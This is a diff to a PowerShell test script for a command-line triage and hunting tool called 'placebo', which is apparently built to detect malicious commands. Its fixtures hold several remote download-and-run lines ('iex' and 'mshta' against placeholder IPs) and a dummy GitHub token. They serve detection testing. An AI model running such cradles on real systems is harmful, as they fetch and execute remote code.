@@ -13,6 +13,10 @@ New-Item -ItemType Directory -Force -Path $work | Out-Null
 
 $tok = 'ghp_' + ('A' * 36)
 
+# forward-slash paths: .net accepts them on windows and the cli child handler
+# does not split tokens at a drive colon this way
+function ConvertTo-ForwardSlash { param([string]$P) return ($P -replace '\\', '/') }
+
 $script:pass = 0; $script:fail = 0; $script:failures = @()
 function Assert-True {
     param([Parameter(Mandatory)][bool]$Cond, [Parameter(Mandatory)][string]$Name)
@@ -49,7 +53,7 @@ $stdinOut = 'iex http://198.51.100.1/a.ps1' | & $pwsh -NoProfile -File $dist tri
 Assert-True ($LASTEXITCODE -ge 1 -and ($stdinOut -join ' ') -match 'SUSPICIOUS|MALICIOUS') -Name 'stdin triage works'
 
 # json structure + masking (diagnose windows-native arg quirks if it breaks)
-$fxJson = Join-Path $work 'tri.json'
+$fxJson = ConvertTo-ForwardSlash (Join-Path $work 'tri.json')
 $triCmd = "powershell -c iex http://198.51.100.4/a.ps1; echo '$tok'"
 $jsonRun = & $pwsh -NoProfile -File $dist triage $triCmd --json "--out=$fxJson" 2>&1
 $jsonRc = $LASTEXITCODE
@@ -63,13 +67,13 @@ Assert-True ($null -ne $j -and $j.tool -eq 'placebo' -and $j.verdict -ne '') -Na
 Assert-True ($jraw -notmatch [regex]::Escape($tok)) -Name 'json report carries no full token'
 
 # md report
-$fxMd = Join-Path $work 'tri.md'
+$fxMd = ConvertTo-ForwardSlash (Join-Path $work 'tri.md')
 & $pwsh -NoProfile -File $dist triage 'mshta http://203.0.113.5/a.hta' --md "--out=$fxMd" | Out-Null
 $md = [System.IO.File]::ReadAllText($fxMd)
 Assert-True ($md -match '^# placebo triage report') -Name 'markdown report written via --out'
 
 Write-Output '== forge + hunt flows'
-$f1 = Join-Path $work 'v1'; $f2 = Join-Path $work 'v2'
+$f1 = ConvertTo-ForwardSlash (Join-Path $work 'v1'); $f2 = ConvertTo-ForwardSlash (Join-Path $work 'v2')
 & $pwsh -NoProfile -File $dist forge "--out=$f1" --profile=clickfix-enc | Out-Null
 & $pwsh -NoProfile -File $dist forge "--out=$f2" --profile=clickfix-enc | Out-Null
 Assert-True (Test-Path (Join-Path $f1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')) -Name 'forge creates history via cli'
@@ -77,7 +81,7 @@ $h1 = (Get-FileHash -Algorithm SHA256 (Join-Path $f1 'AppData/Roaming/Microsoft/
 $h2 = (Get-FileHash -Algorithm SHA256 (Join-Path $f2 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')).Hash
 Assert-True ($h1 -eq $h2) -Name 'forge deterministic via cli'
 
-$huntJson = Join-Path $work 'hunt.json'
+$huntJson = ConvertTo-ForwardSlash (Join-Path $work 'hunt.json')
 & $pwsh -NoProfile -File $dist hunt "--paths=$f1" --json "--out=$huntJson" | Out-Null
 $huntExit = $LASTEXITCODE
 $hj = ([System.IO.File]::ReadAllText($huntJson)) | ConvertFrom-Json
